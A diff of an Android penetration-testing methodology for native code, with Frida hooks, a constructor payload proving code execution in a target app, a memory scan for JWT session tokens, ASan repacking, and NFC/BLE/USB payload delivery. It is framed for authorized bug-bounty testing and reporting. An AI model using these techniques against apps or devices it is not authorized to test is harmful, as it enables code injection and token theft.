   Observe the loads at runtime — this catches paths that are computed:
   ```javascript
@@ -1721,18 +1804,19 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
     var S = Java.use('java.lang.System');
     S.load.implementation = function (p) { console.log('System.load -> ' + p); return this.load(p); };
   });
-  Interceptor.attach(Module.findExportByName(null, 'dlopen'), {
+  Interceptor.attach(Module.findGlobalExportByName('dlopen'), {   // Frida ≥ 17 form; android_dlopen_ext too
     onEnter(a) { console.log('dlopen ' + a[0].readCString()); }
   });
   ```
   Minimal payload — a constructor proves execution without any app cooperation:
   ```c
   __attribute__((constructor)) static void go(void) {
-      system("id > /data/data/com.target.app/files/PWNED");
+      system("id > /sdcard/Android/data/com.target.app/files/PWNED");   /* app-specific external dir: readable by adb shell without run-as */
   }
   ```
-- **Proof:** `adb shell run-as com.target.app cat files/PWNED` printing `uid=10xxx(u0_aXXX)` matching the
-  victim app's UID after a relaunch, plus `Process.enumerateModules()` listing your library's path inside the
+- **Proof:** `adb -s "$SERIAL" shell cat /sdcard/Android/data/$PKG/files/PWNED` printing `uid=10xxx(u0_aXXX)`
+  matching the victim app's UID after a relaunch (`run-as` works only on debuggable packages — never use it in
+  a proof against a release build), plus `Process.enumerateModules()` listing your library's path inside the
   target process.
 - **Escalation:** → D17 (persistent code execution across restarts); → D21 (your library's constructor runs
   before every RASP check). The known real-world shapes: TikTok's `lib-main/libimagepipeline.so`,
@@ -1762,7 +1846,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   and on the OEM device it executes vendor code inside its own sandbox.
 - **How:**
   ```bash
-  grep -RnE 'System\.load\("/(system|vendor|apex)/' out/sources/
+  grep -RnE 'System\.load\("/(system|vendor|apex)/' "$DEC/jadx/sources"
   adb shell cat /system/etc/public.libraries.txt
   adb shell ls /system/etc/public.libraries-*.txt 2>/dev/null
   adb logcat | grep -iE 'dlopen failed|library ".*" not found|is not accessible for the namespace'
@@ -1785,7 +1869,7 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; otherwise rate the crash |
 | **Attacker** | AM-02 / AM-03 depending on which bridge reaches the plugin |
 | **Applies to** | Flutter, React Native, Unity, Xamarin, Qt and Cordova builds — all of which ship third-party native plugins that do their own string and buffer handling |
-| **Requires** | native, flutter, react-native, unity, xamarin, cordova, capacitor |
+| **Requires** | native |
 | **Maps to** | MASTG-TECH-0140, MASTG-TOOL-0107 (jnitrace), MASTG-TOOL-0129 (rabin2), MASTG-TOOL-0003 (nm); MASWE-0050 |
 
 - **Test:** A "managed" cross-platform app still has a native attack surface: every plugin ships a `.so` with
@@ -1794,24 +1878,13 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **How:**
   ```bash
   unzip -l base.apk | grep -E 'libmonodroid|libunity|libflutter|libhermes|index.android.bundle|assets/www|assets/Data|QtAndroid'
-  for so in x/lib/arm64-v8a/*.so; do echo "== $so"; nm -D "$so" 2>/dev/null | grep ' T Java_'; done
-  rabin2 -s x/lib/arm64-v8a/libX.so | grep JNI
-  jnitrace -l libX.so -f com.target.app
-  grep -rnE 'MethodChannel|EventChannel|BasicMessageChannel|setMethodCallHandler|@ReactMethod|UnityPlayer\.UnitySendMessage|QAndroidJniObject|invokeMethod' out/sources | head -40
+  for so in "$LIBS"/lib/arm64-v8a/*.so; do echo "== $so"; nm -D "$so" 2>/dev/null | grep ' T Java_'; done
+  rabin2 -s "$LIBS"/lib/arm64-v8a/libX.so | grep JNI
+  jnitrace -m spawn -l libX.so "$PKG"        # spawn is -m spawn (there is no -f); pinned venv / fallback: D16-017
+  grep -rnE 'MethodChannel|EventChannel|BasicMessageChannel|setMethodCallHandler|@ReactMethod|UnityPlayer\.UnitySendMessage|QAndroidJniObject|invokeMethod' "$DEC/jadx/sources" | head -40
   ```
-  Enumerate the channel names and drive them directly:
-  ```javascript
-  // Flutter: capture every channel name and every call with its arguments
-  Java.perform(function () {
-    var MC = Java.use('io.flutter.plugin.common.MethodChannel');
-    MC.$init.overload('io.flutter.plugin.common.BinaryMessenger', 'java.lang.String').implementation =
-      function (m, name) { console.log('[MethodChannel] ' + name); return this.$init(m, name); };
-    var MCall = Java.use('io.flutter.plugin.common.MethodCall');
-    MCall.$init.overload('java.lang.String', 'java.lang.Object').implementation = function (m, a) {
-      console.log('[call] ' + m + ' ' + a); return this.$init(m, a);
-    };
-  });
-  ```
+  Enumerate the channel names and drive them directly. Flutter channel enumeration (`MethodChannel` /
+  `EventChannel` / `BasicMessageChannel` hooks) is **D19-040** — run it there and feed the channel list here.
   ```javascript
   // React Native: list the native modules the bridge exposes, then call the dangerous ones
   console.log(Object.keys(this.nativeModuleProxy || {}));
@@ -1836,21 +1909,25 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 | **Requires** | device |
 | **Maps to** | ATT&CK T1631.001 (Ptrace System Calls), T1631, T1617 (Hooking); MASTG-TECH-0044; CWE-200 |
 
-- **Test:** Can another process attach to the app? The three conditions are the `android:debuggable` flag,
+- **Test:** **Owner: D02-029 / D02-030** (the debuggable production build and the JDWP attach); this item
+  adds only the ptrace/`PR_SET_DUMPABLE` check and the heap scan. Can another process attach to the app? The three conditions are the `android:debuggable` flag,
   the device's `ptrace_scope`, and whether the app calls `PR_SET_DUMPABLE(0)`. An attachable process is a
   live memory-disclosure and code-injection surface.
 - **How:**
   ```bash
-  PID=$(adb shell pidof -s com.target.app)
-  adb shell "cat /proc/$PID/status | grep -E 'TracerPid|Seccomp|VmLck'"
-  adb shell "su -c 'cat /proc/sys/kernel/yama/ptrace_scope'" 2>/dev/null
+  PID=$(adb -s "$SERIAL" shell pidof -s "$PKG")
+  adb -s "$SERIAL" shell "cat /proc/$PID/status | grep -E 'TracerPid|Seccomp|VmLck'"
+  adb -s "$SERIAL" shell "su -c 'cat /proc/sys/kernel/yama/ptrace_scope'" 2>/dev/null
   aapt2 dump badging base.apk | grep -i debuggable
-  grep -rnE 'prctl|PR_SET_DUMPABLE|ptrace|TracerPid' out/sources/ x/lib/*/*.so
-  frida -D "$SERIAL" -n com.target.app -e 'Process.enumerateModules().slice(0,5)'
+  grep -rnE 'prctl|PR_SET_DUMPABLE|ptrace|TracerPid' "$DEC/jadx/sources" "$LIBS"/lib/*/*.so
+  frida -D "$SERIAL" -n "$PKG" -q -t 5 -e 'Process.enumerateModules().slice(0,5)'
   ```
   Scrape the heap for session material:
   ```javascript
-  Memory.scanSync(Process.getModuleByName('libc.so').base, 0x1000000, '65 79 4a')   // "eyJ" — JWT prefix
+  // scan the writable ranges (heap, anon), not libc's own mappings
+  Process.enumerateRanges('rw-').forEach(r => {
+    try { Memory.scanSync(r.base, r.size, '65 79 4a').forEach(m => console.log(r.file ? r.file.path : '[anon]', m.address, m.address.readUtf8String(48))); } catch (e) {}   // "eyJ" — JWT prefix
+  });
   ```
 - **Proof:** Frida attaching to the **release** build by name (not spawn) on a **non-rooted** device, plus a
   memory scan recovering a plaintext token — and the `aapt2` line showing `application-debuggable`. Without
@@ -1877,8 +1954,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   anything larger than 64 KB — typically **silently**, because the return value is not checked.
 - **How:**
   ```bash
-  grep -rn 'mlock\|mlockall\|MADV_DONTDUMP\|memset_s\|explicit_bzero' native-src/
-  nm -D x/lib/*/*.so | grep -E ' U (mlock|mlockall|madvise|explicit_bzero|memset_s)$'
+  grep -rn 'mlock\|mlockall\|MADV_DONTDUMP\|memset_s\|explicit_bzero' "$SRC"
+  nm -D "$LIBS"/lib/*/*.so | grep -E ' U (mlock|mlockall|madvise|explicit_bzero|memset_s)$'
   adb shell cat /proc/$(adb shell pidof com.target.app)/status | grep -i vmlck
   ```
 - **Proof:** `VmLck` far below the buffer size the code intends to lock, with the `mlock` return value
@@ -1945,7 +2022,9 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   hardware** — an on-device ASan report is materially more persuasive than a host one.
 - **How:** Host build:
   ```bash
-  clang++ -O1 -g \
+  # host libFuzzer build needs LLVM clang, not Apple clang (no libFuzzer): brew install llvm → /opt/homebrew/opt/llvm/bin/clang++, or apt install clang
+  HOSTCXX=${HOSTCXX:-$(command -v /opt/homebrew/opt/llvm/bin/clang++ || command -v clang++)}
+  $HOSTCXX -O1 -g \
     -fsanitize=address,undefined -fno-omit-frame-pointer \
     -fsanitize=fuzzer \
     target_fuzz.cc -o target_fuzz
@@ -1953,21 +2032,25 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   ```
   Cross-compile the reproducer for the device:
   ```bash
-  NDK=$HOME/Library/Android/sdk/ndk/29.0.13599879
-  CC=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/bin/aarch64-linux-android31-clang
-  ASAN_RT=$NDK/toolchains/llvm/prebuilt/darwin-x86_64/lib/clang/20/lib/linux/libclang_rt.asan-aarch64-android.so
+  SRC=${SRC:-$E/native-src/<library>}                                   # the upstream checkout at the fingerprinted version (D16-006); D16-024..027/033/043 grep it
+  NDK=${ANDROID_NDK_HOME:-$(ls -d "$HOME"/Library/Android/sdk/ndk/* "$HOME"/Android/Sdk/ndk/* 2>/dev/null | sort -V | tail -1)}
+  HOSTTAG=$(ls "$NDK/toolchains/llvm/prebuilt")                          # darwin-x86_64 (also on Apple silicon) or linux-x86_64
+  TC=$NDK/toolchains/llvm/prebuilt/$HOSTTAG; API=31
+  CC=$TC/bin/aarch64-linux-android$API-clang
+  ASAN_RT=$(ls "$TC"/lib/clang/*/lib/linux/libclang_rt.asan-aarch64-android.so | tail -1)
+  JOBS=$(getconf _NPROCESSORS_ONLN)                                      # nproc is GNU-only
 
   cmake .. -DCMAKE_TOOLCHAIN_FILE=$NDK/build/cmake/android.toolchain.cmake \
     -DANDROID_ABI=arm64-v8a -DANDROID_PLATFORM=android-31 \
     -DCMAKE_BUILD_TYPE=Debug \
     -DCMAKE_C_FLAGS="-g -O0 -fsanitize=address -fno-omit-frame-pointer"
-  make -j$(nproc)
+  make -j"$JOBS"
 
   $CC -g -O0 -fsanitize=address -fno-omit-frame-pointer \
     -I../inc -I./include poc.c ./lib/libtarget.a -lm -o poc
 
-  adb push poc $ASAN_RT /data/local/tmp/
-  adb shell "LD_LIBRARY_PATH=/data/local/tmp ASAN_OPTIONS=detect_leaks=0 /data/local/tmp/poc /data/local/tmp/input"
+  adb -s "$SERIAL" push poc "$ASAN_RT" /data/local/tmp/
+  adb -s "$SERIAL" shell "LD_LIBRARY_PATH=/data/local/tmp ASAN_OPTIONS=detect_leaks=0 /data/local/tmp/poc /data/local/tmp/input"
   ```
 - **Proof:** An ASan report naming the access type, size and byte offset relative to the allocation — e.g.
   `heap-buffer-overflow … READ of size 1 … is located 0 bytes after 333-byte region` — produced **on the
@@ -2239,8 +2322,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **How:**
   ```bash
   adb logcat -b crash -d | grep -E 'ubsan:|__ubsan_handle|Abort message'
-  nm -D x/lib/*/*.so | grep -E '__ubsan_handle|__asan_|__hwasan_'
-  readelf -sW x/lib/*/*.so | grep -c '__ubsan_handle'
+  nm -D "$LIBS"/lib/*/*.so | grep -E '__ubsan_handle|__asan_|__hwasan_'
+  $READELF -sW "$LIBS"/lib/*/*.so | grep -c '__ubsan_handle'
   ```
 - **Proof:** `__ubsan_handle_*` frames in the tombstone and an `Abort message: 'ubsan: …'` line. The worked
   observation: "`libdng_sdk.so` ships with unsigned-integer-overflow sanitization even on user/release-keys
@@ -2284,9 +2367,10 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   | SELinux domain policy | `ps -AZ` (D16-054) | limits what the executed code can touch |
 
   For root-causing on a research device you may disable some of these — `personality(ADDR_NO_RANDOMIZE)`
-  (ARM syscall **136**, not wrapped by Bionic, so call it via `syscall()`), `setarch`,
-  `execstack -s <binary>`, and the sysctls — but **never in the recorded PoC**, and note that `personality`
-  is ignored for set-uid binaries and that PIE and full RELRO are **not practically removable** by patching.
+  from `<sys/personality.h>` (bionic wraps it; if you must use `syscall()`, the number is **92** on AArch64 and
+  136 on 32-bit ARM), or `echo 0 > /proc/sys/kernel/randomize_va_space` as root, and the other sysctls — but
+  **never in the recorded PoC**; `setarch` and `execstack` do not exist on Android, `personality` is ignored
+  for set-uid binaries, and PIE and full RELRO are **not practically removable** by patching.
 - **Proof:** A paragraph in the report stating, per layer, which mitigations you verified on the target build
   and **which step of your chain each one would have blocked**. "Exploitable" without that context is not a
   claim a triager can act on.
@@ -2347,8 +2431,8 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
   untrusted-content parser is the finding; its **presence** is the reason your crash is contained.
 - **How:**
   ```bash
-  grep -nE 'isolatedProcess|externalService|android:process=' x/AndroidManifest.xml
-  rg -n 'MediaCodec|ImageDecoder|BitmapFactory|ZipInputStream|System.loadLibrary' out/sources/
+  grep -nE 'isolatedProcess|externalService|android:process=' "$DEC/apktool/AndroidManifest.xml"
+  grep -rnE 'MediaCodec|ImageDecoder|BitmapFactory|ZipInputStream|System\.loadLibrary' "$DEC/jadx/sources"
   adb shell ps -AZ | grep -E "isolated_app|com.target"
   ```
   Note that `android:process=":something"` is **not** isolation — separate address space, same UID, same
@@ -2377,20 +2461,23 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **Test:** Two common over-credits. (1) **ASLR:** every app forks from the same zygote, so the library
   layout is shared across processes — an ordinary installed app can read its own maps and disclose the
   addresses another app's process is using. (2) **Kernel address hiding:** `kptr_restrict` and
-  `dmesg_restrict` hide `/proc/kallsyms`, but Android kernels ship as one fixed image with **no KASLR**, so
-  the symbols are constants extractable from firmware you can download.
+  `dmesg_restrict` hide `/proc/kallsyms` and the log; on 2017+ arm64 kernels KASLR (`CONFIG_RANDOMIZE_BASE`)
+  is on and every GKI kernel ships it, so kernel symbol *addresses* are not firmware constants — only their
+  offsets are. Treat kernel ASLR as a real layer that needs a leak (D25); the zygote-sharing argument applies
+  to user-space library bases only.
 - **How:**
   ```bash
   # from an ordinary app (or adb, for triage) compare library bases across processes
-  adb shell cat /proc/self/maps | grep -E 'libc.so|linker64' 
-  adb shell cat /proc/$(adb shell pidof com.target.app)/maps | grep -E 'libc.so|linker64'
-  adb shell cat /proc/sys/kernel/randomize_va_space /proc/sys/kernel/kptr_restrict /proc/sys/kernel/dmesg_restrict
+  adb -s "$SERIAL" shell cat /proc/self/maps | grep -E 'libc.so|linker64'
+  adb -s "$SERIAL" shell cat /proc/$(adb -s "$SERIAL" shell pidof -s "$PKG")/maps | grep -E 'libc.so|linker64'
+  adb -s "$SERIAL" shell cat /proc/sys/kernel/randomize_va_space /proc/sys/kernel/kptr_restrict /proc/sys/kernel/dmesg_restrict
+  adb -s "$SERIAL" shell su -c 'zcat /proc/config.gz' 2>/dev/null | grep -E 'RANDOMIZE_BASE|KPTR|STACKPROTECTOR'   # is KASLR built in?
   ```
 - **Proof:** Matching library base addresses across two processes forked from the same zygote. For the kernel
-  case, the symbol addresses recovered offline from the factory image.
+  case, the `CONFIG_RANDOMIZE_BASE` line and the leak your chain would need, stated.
 - **Escalation:** If your chain needed an information leak and the zygote sharing supplies it, say so — it
-  strengthens the finding. Conversely, **do not credit kernel address hiding as a mitigation in a severity
-  argument**; it raises effort, not feasibility.
+  strengthens the finding. Credit kernel ASLR as a layer and state the leak you would need; `kptr_restrict` alone (symbol
+  *names*) raises effort, not feasibility.
 - **Ruled out when:** the target process is not zygote-forked (a separate native binary, a vendor service),
   or the address you need belongs to a heap allocation rather than a mapped library — in which case the leak
   requirement is real and you must satisfy it.
@@ -2550,11 +2637,200 @@ tail -n +2 "$E/inventory/deeplinks.csv" | wc -l
 - **Ruled out when:** the finding genuinely stands alone (a single reachable decoder overflow with a
   first-party delivery path and no other primitive involved), in which case file one report and say so.
 
+### D16-061 · Native code mapped from another package into the app's process — attribute it before you drop it
+
+| | |
+|---|---|
+| **Severity ceiling** | Support (scope attribution); the bug found inside the module is rated by its owner's programme |
+| **VRT** | n/a (enabler — the module's own bug is rated where it is owned) |
+| **Attacker** | n/a (mapping); rows inherit AM-01/AM-02/AM-03 from the feeding surface |
+| **Applies to** | apps that load code from another installed package: platform-services dynamic modules (`DynamiteModule`, feature containers), `createPackageContext(pkg, CONTEXT_INCLUDE_CODE \| CONTEXT_IGNORE_SECURITY)`, `DelegateLastClassLoader` over a foreign APK, OEM SDK containers — typical for ML/scanning, ads, maps and payment SDKs |
+| **Requires** | native, device, frida |
+| **Maps to** | MASTG-TECH-0029; ATT&CK T1575; `developer.android.com/reference/android/content/Context#createPackageContext` |
+| **Record** | logs/D16-061.txt (loader list + maps diff); one table row per module |
+
+- **Skip when:** `/proc/<pid>/maps` shows no `.so` / `.apk!` mapping outside the app's own `/data/app/…/<pkg>-*/`
+  and the platform partitions after the ML/scan/pay flows **and** the loader grep below is empty — write
+  `D16-061 n/a — no foreign-package code in the process after <flows>`.
+- **Test:** D16-001/D16-002 know two classes: shipped and hidden. The third class is code the app pulls in from
+  another package at runtime — neither in the APK nor packed. It is frequently the ONLY native parser the app
+  feeds with attacker bytes (camera frames, scanned codes, downloaded images). Enumerate it, find which app
+  surfaces feed it, and decide scope: the module's owner (platform/vendor programme) or the app (the feeding
+  path and what the app does with the result).
+- **How:**
+  ```bash
+  grep -rnE 'DynamiteModule|createPackageContext\(|CONTEXT_INCLUDE_CODE|DelegateLastClassLoader|Feature\("[a-z_]+"' "$DEC/jadx/sources" | head -40
+  PID=$(adb -s "$SERIAL" shell pidof -s "$PKG")
+  adb -s "$SERIAL" shell cat /proc/$PID/maps | grep -E '\.so|\.apk' | awk '{print $6}' | sort -u \
+    | grep -vE "^/(system|apex|vendor|product|system_ext)/|/data/app/[^/]*/$PKG-" | tee "$E/logs/D16-061.txt"
+  for p in $(cut -d'!' -f1 "$E/logs/D16-061.txt" | sort -u); do adb -s "$SERIAL" shell pm list packages -f | grep -F "$p"; done   # owning package
+  ```
+  ```javascript
+  // which class loaders are live — a loader over a foreign APK path is the module
+  Java.perform(() => Java.enumerateClassLoadersSync().forEach(l => console.log(l.toString().slice(0, 200))));
+  ```
+- **Proof:** A table `module path | owning package | signer | loader call site file:line | app surface feeding
+  it | scope (app / owner programme)`, plus the D16-005 row for every app surface that feeds a module.
+- **Escalation:** feeding-path bug → D16-005 with the module as the sink; bug inside the module → the owner's
+  programme (D25 for OEM code); an unverified loader (prefix match, no signature check) → D17-013 / D17-021.
+- **Ruled out when:** class-loader enumeration shows only the app's own `PathClassLoader` and the boot loader,
+  and the maps diff is empty after exercising the ML/scan/pay flows — name the flows.
+
+### D16-062 · Manifest-declared memory mitigations: MTE mode, GWP-ASan mode, heap pointer tagging
+
+| | |
+|---|---|
+| **Severity ceiling** | Low standalone (an opt-out is hardening context); it re-rates every heap finding in the chapter |
+| **VRT** | `lack_of_binary_hardening.lack_of_exploit_mitigations` (**P5**) standalone; cited inside the memory-safety finding's D16-053 paragraph |
+| **Attacker** | n/a (rating input) |
+| **Applies to** | all apps with native code; `memtagMode` is only live on MTE hardware (recent flagship SoCs) or an MTE-enabled emulator image |
+| **Requires** | native |
+| **Maps to** | `developer.android.com/ndk/guides/arm-mte`; `developer.android.com/ndk/guides/gwp-asan`; `developer.android.com/about/versions/11/behavior-changes-all` (heap pointer tagging); MASTG-KNOW-0006 |
+| **Record** | logs/D16-062.txt (manifest attributes + device MTE state) |
+
+- **Skip when:** the app ships no native code (D16-001) — the attributes still parse but gate nothing; write
+  `D16-062 n/a — no native code`.
+- **Test:** Three `<application>` attributes decide what a heap bug does on this device: `memtagMode`
+  (`off`/`async`/`sync`, API 33+) turns an overflow/UAF into a tag-check fault; `gwpAsanMode`
+  (`always`/`never`/default, API 30+) samples allocations onto guard pages; `allowNativeHeapPointerTagging="false"`
+  (API 30+) opts out of top-byte heap pointer tagging, which also disables MTE for the process. Read them, then
+  read the device.
+- **How:**
+  ```bash
+  grep -oE 'android:(memtagMode|gwpAsanMode|allowNativeHeapPointerTagging)="[^"]*"' "$DEC/apktool/AndroidManifest.xml"
+  adb -s "$SERIAL" shell getprop | grep -iE 'memtag|arm64\.memtag|mte'          # device MTE state
+  PID=$(adb -s "$SERIAL" shell pidof -s "$PKG"); adb -s "$SERIAL" shell cat /proc/$PID/maps | grep -c 'GWP-ASan'   # guard-page region present = sampling live
+  ```
+- **Proof:** The attribute values quoted from the manifest and the device MTE property line; for a heap finding,
+  the tombstone signal: `SEGV_MTESERR` / `SEGV_MTEAERR` (MTE) or `Cause: [GWP-ASan]` (GWP-ASan) versus a plain
+  `SEGV_MAPERR`.
+- **Escalation:** → D16-053 (add rows "MTE (memtagMode)", "GWP-ASan" and "heap pointer tagging" to the layer
+  table); `allowNativeHeapPointerTagging="false"` on a parser library → ask why in the hardening appendix (the
+  usual answer is pointer arithmetic that would break under tagging — a code smell for D16-033).
+- **Ruled out when:** all three attributes are absent or default and the device has no MTE — then the heap
+  findings are rated on Scudo alone and you write that sentence.
+
+### D16-063 · Read the free sanitizer verdict in the tombstone (GWP-ASan, MTE) before building a harness
+
+| | |
+|---|---|
+| **Severity ceiling** | Support (evidence quality); it moves a crash to a named memory-safety class |
+| **VRT** | n/a — evidence quality; it feeds the P1/P3 decision of D16-035 |
+| **Attacker** | n/a — inherits the delivering item's model |
+| **Applies to** | every native crash on Android 11+ (GWP-ASan samples all apps; recoverable mode on 14+); MTE lines only on MTE hardware |
+| **Requires** | native, device |
+| **Maps to** | `developer.android.com/ndk/guides/gwp-asan`; `developer.android.com/ndk/guides/arm-mte`; MASTG-TECH-0044 |
+| **Record** | logs/D16-063.txt (tombstone cause block), pocs/F-NNN/ |
+
+- **Skip when:** no crash has been produced yet (D16-035/036/037 first) — write `D16-063 pending — no tombstone`.
+- **Test:** The tombstone may already name the bug class. GWP-ASan samples allocations onto guard pages and, when
+  hit, prints `Cause: [GWP-ASan]: Use After Free / Buffer Overflow, N bytes into a M-byte allocation` with the
+  allocation and deallocation stacks on the **shipped** build; MTE reports tag mismatches as `SEGV_MTESERR`
+  (sync) or `SEGV_MTEAERR` (async). Read those lines before writing "control unknown".
+- **How:**
+  ```bash
+  grep -nE 'Cause: \[GWP-ASan\]|allocated by thread|deallocated by thread|SEGV_MTE[AS]ERR|MTE' tombstone_*.txt
+  # make the sample land every time on the test device (rooted harness; app restart required)
+  adb -s "$SERIAL" shell su -c "setprop libc.debug.gwp_asan.process_sampling.$PKG 1; setprop libc.debug.gwp_asan.sample_rate.$PKG 1; setprop libc.debug.gwp_asan.max_allocs.$PKG 40000"
+  adb -s "$SERIAL" shell am force-stop "$PKG"   # then re-run the trigger from D16-035 and recapture (D16-049)
+  ```
+- **Proof:** The `Cause:` block quoted verbatim with both stacks, plus the same trigger reproducing the verdict
+  twice; or the `SEGV_MTESERR` signal line with the faulting instruction's tag mismatch.
+- **Escalation:** "Use After Free" → D16-030 with the controllability questions; "Buffer Overflow … WRITE" →
+  D16-028 / D16-033; the properties are AM-12 evidence tooling — reset them (`setprop … ""`) and say so in the
+  report (D16-058's negative control = the same input with sampling off).
+- **Ruled out when:** the tombstone carries no sanitizer cause after the sampling properties were raised and the
+  crash reproduced ≥ 3 times — then the class is unestablished and D16-045 / D16-064 is the next step.
+
+### D16-064 · ASan/HWASan on the real caller path: `wrap.sh` repack or an HWASan system image
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical (it produces the ASan verdict on the app's own code path) |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) via the bug it surfaces; `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (**P3**) crash-only |
+| **Attacker** | AM-12 for the instrumented build (evidence tooling); the delivery inherits D16-005's row (AM-01/AM-02/AM-03) |
+| **Applies to** | apps whose `.so` you cannot rebuild from source, or where the harness cannot replicate the Java call sequence (D16-046); API 27+ for `wrap.sh` |
+| **Requires** | native, device |
+| **Maps to** | `developer.android.com/ndk/guides/asan` (wrap.sh), `developer.android.com/ndk/guides/hwasan`; MASTG-KNOW-0005; MASTG-TECH-0044 |
+| **Record** | logs/D16-064.txt (ASan report from logcat), pocs/F-NNN/ (the repack recipe — never the repacked APK) |
+
+- **Skip when:** the parser is source-available and D16-045 already gives a verdict on the real sequence — write
+  `D16-064 n/a — verdict from the source harness (D16-045)`.
+- **Test:** ASan needs compile-time instrumentation of the *vulnerable* code's own memory accesses, so an
+  uninstrumented vendor `.so` only gets interceptor-level checks (heap metadata, `memcpy`/`str*` bounds, UAF of
+  quarantined chunks) — still a named verdict for the overflow classes in D16-020/024/027 — and HWASan on a
+  `hwasan` image instruments the platform side. Repack the APK debuggable with a `wrap.sh` that preloads the
+  ASan runtime, reinstall, and drive the **real** surface from D16-005. This satisfies D16-046's reachability
+  rule by construction: the caller is the app itself.
+- **How:**
+  ```bash
+  ASAN_RT=$(ls "$NDK"/toolchains/llvm/prebuilt/*/lib/clang/*/lib/linux/libclang_rt.asan-aarch64-android.so | tail -1)   # $NDK from D16-045
+  mkdir -p repack/lib/arm64-v8a && cp "$ASAN_RT" repack/lib/arm64-v8a/
+  cat > repack/lib/arm64-v8a/wrap.sh <<'EOF'
+  #!/system/bin/sh
+  HERE="$(cd "$(dirname "$0")" && pwd)"
+  export ASAN_OPTIONS=log_to_syslog=false,allow_user_segv_handler=1,abort_on_error=1
+  export LD_PRELOAD=$HERE/libclang_rt.asan-aarch64-android.so
+  exec "$@"
+  EOF
+  # apktool d → set android:debuggable="true" and android:extractNativeLibs="true", add the two files, apktool b, zipalign, apksigner with your test key (D02 recipe)
+  adb -s "$SERIAL" install -r repacked.apk && adb -s "$SERIAL" logcat -c
+  # deliver the crafted input through the REAL surface (D16-035/036/037), then:
+  adb -s "$SERIAL" logcat -d | grep -A40 'AddressSanitizer'
+  # HWASan alternative for platform-side parsers: boot a 'hwasan' emulator image and run the UNMODIFIED APK
+  ```
+- **Proof:** `ERROR: AddressSanitizer: heap-buffer-overflow … WRITE of size N` (or `heap-use-after-free`) in
+  logcat with the app's own `Java_*` frame in the stack, produced by the real delivery command; then the same
+  input on the unmodified release APK → tombstone (D16-049). Quote both: the repack is tooling, the release
+  tombstone is the finding.
+- **Escalation:** → D16-053; → D16-051 for root cause (ASan gives allocation and free stacks); the repacked APK
+  is never attached to a report (D02 signing caveat — it is your key).
+- **Ruled out when:** the wrapped app runs the full flow with no sanitizer report under the same inputs that
+  crash the release build — then the crash is outside ASan's interceptor coverage (an intra-object or stack
+  bug) and D16-045 / D16-047 is required.
+
+### D16-065 · Peripheral and proximity channels that feed a native parser without a tap (NFC, BLE, USB, Nearby)
+
+| | |
+|---|---|
+| **Severity ceiling** | Critical (proximity 0-click into native code) |
+| **VRT** | `server_side_injection.remote_code_execution_rce` (**P1**) with execution; `application_level_denial_of_service_dos.high_impact_and_or_medium_difficulty` (**P3**) crash-only |
+| **Attacker** | AM-01 (no interaction; attacker within radio/USB range) / AM-02 when a pairing or tap is required |
+| **Applies to** | apps declaring `android.permission.NFC`, `BLUETOOTH_CONNECT`/`BLUETOOTH_SCAN`, `<uses-feature android:name="android.hardware.usb.host">` or `.accessory`, Nearby / Wi-Fi Aware, and shipping a native SDK that consumes the bytes (card readers, wearables, OBD/IoT, transit) |
+| **Requires** | native, device, physical |
+| **Maps to** | MASTG-KNOW-0005; MASWE-0050; `developer.android.com/guide/topics/connectivity/nfc/nfc`, `…/connectivity/bluetooth/ble-overview`, `…/connectivity/usb/accessory`; ATT&CK T1658 |
+| **Record** | logs/D16-065.txt (JNI boundary trace per channel), pocs/F-NNN/ |
+
+- **Skip when:** none of the permissions/features above is in the manifest (`grep -cE 'NFC|BLUETOOTH_(CONNECT|SCAN)|usb\.(host|accessory)|NEARBY_WIFI_DEVICES' "$DEC/apktool/AndroidManifest.xml"` = 0),
+  or the receiving code is pure Java/Kotlin with no D16-005 row downstream — write `D16-065 n/a — no peripheral channel reaches native code`.
+- **Test:** For each channel, find the handler (`onNewIntent` with `NfcAdapter.ACTION_NDEF_DISCOVERED`,
+  `BluetoothGattCallback.onCharacteristicChanged`, `UsbDeviceConnection.bulkTransfer`,
+  `PayloadCallback.onPayloadReceived`) and follow the byte array to a native method. If it arrives there, the
+  attacker model is the radio, not the user. D16-036/D16-037 cover files and HTTP fetches; this is the third
+  0-click class.
+- **How:**
+  ```bash
+  grep -oE 'android.permission.(NFC|BLUETOOTH_CONNECT|BLUETOOTH_SCAN|NEARBY_WIFI_DEVICES)|android.hardware.usb.(host|accessory)' "$DEC/apktool/AndroidManifest.xml" | sort -u
+  grep -rnE 'ACTION_NDEF_DISCOVERED|ACTION_TECH_DISCOVERED|onCharacteristicChanged|bulkTransfer|controlTransfer|onPayloadReceived|IsoDep|NfcA\b' "$DEC/jadx/sources" | head -40
+  # bind to the native sink: hook the Java handler and the Java_* entry together (the D16-019 three-way pattern)
+  ```
+  Deliver: an NDEF tag written with `nfcpy` or a second phone (`NdefRecord.createMime`), a BLE peripheral script
+  (`bleak`, or a GATT-server app) advertising the service UUID from the code, a USB accessory emulated with a
+  single-board gadget — each carrying the oversized / length-mismatched payloads from D16-018.
+- **Proof:** The `[native] entered len=…` line (D16-019) printed for bytes that arrived over the channel with no
+  tap, plus the tombstone with a controlled fault address, plus a photo/video of the delivery hardware and the
+  device screen showing no interaction.
+- **Escalation:** → D16-035 path for the crash; the interaction multiplier (0-click) → D27; a channel that also
+  carries a session token → D13.
+- **Ruled out when:** every channel handler validates length/type in Java before the native call and the native
+  symbol never fires for malformed payloads (D16-019), **or** the bytes are consumed entirely in managed code —
+  show the handler-to-sink chain for each declared channel.
+
 ## Graveyard for this domain
 
 | Observation | Why it is not a finding | What would make it one |
 |---|---|---|
